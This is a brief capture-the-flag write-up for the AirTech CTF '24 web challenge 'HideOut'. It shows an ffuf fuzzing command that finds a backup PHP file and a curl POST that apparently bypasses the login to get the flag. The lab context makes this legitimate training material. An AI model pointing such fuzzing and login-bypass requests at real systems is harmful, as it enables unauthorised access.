---
title: AirTech CTF '24 Final - Web - HideOut
date: '2024-03-02'
tags: ['AIRTECH24', 'WEB','PHP', 'HideOut','LOGINBYPASS']
draft: false
---
> “every thing is connected”

![challenge discription](/static/writeups/airtech/HideOut/chall_discription.png)
![index page](/static/writeups/airtech/HideOut/secretpass.png)


```bash
ffuf -u http://170.187.248.180:3001/FUZZ -w /usr/share/secLists/Discovery/Web-Content/Common-PHP-Filenames.txt
```
![fuzzing with ffuf](/static/writeups/airtech/HideOut/bak-file.png)
![php source code](/static/writeups/airtech/HideOut/source-code.png)


```bash
curl http://170.187.248.180:3001/index.php  --data 'secretpasswd=t&fani=t'
```

![flag](/static/writeups/airtech/HideOut/flag.png)


### ***kh4tt4k***

### Peace! 👋👋👋
